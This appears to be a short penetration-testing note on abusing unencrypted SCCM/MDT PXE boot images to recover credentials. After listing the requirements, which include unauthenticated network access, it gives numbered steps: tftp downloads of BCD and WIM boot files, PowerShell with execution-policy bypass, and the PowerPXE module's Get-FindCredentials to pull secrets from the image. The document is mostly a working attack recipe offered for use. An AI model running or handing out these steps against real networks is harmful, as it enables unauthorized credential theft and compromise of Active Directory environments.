# Boot Image credentials recovery

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/cred-1-pxe-abuse#unencrypted-boot-mediums

## Unencrypted Boot Mediums

PXE Boot mediums may be deployed to endpoints wherein the PXE boot image is not encrypted. When this is the case it is trivial to initiate the PXE installation sequence and pillage credentials on the resulting image when installation is complete. 

Broadly, this means it is trivial to obtain local SAM hashes and SCCM secrets from the installed image.

## Requirements

1) Unauthenticated network access

2) Line of sight to DHCP server (optional, but helps)

3) Line of sight to PXE-enabled distribution point



#### 1) Request IP and PXE boot preconfigure details from DHCP ( MDT IP)

#### 2) Use TFTP to request each BCD file and enumerate the configuration for all of them.

#### 3) Use SSH connection

#### 4: tftp -i MDT_IP GET "\tmp\x64{30.....28}.bcd"

#### 5: powershell.exe -executionpolicy bypass

#### 6: Import-Module .\PowerPXE.ps1

#### 7: $bcdfILE = "conf.bcd"

#### 8: Get-WimFile -bcdFile $BCDFile

#### 9: tftp -i MDT_IP GET "PXE\BOOT\IMAGE\LOCATION" pxeboot.wim

#### 10: Get-FindCredentials -WimFile pxeboot.wim

#### 11: VOILA!

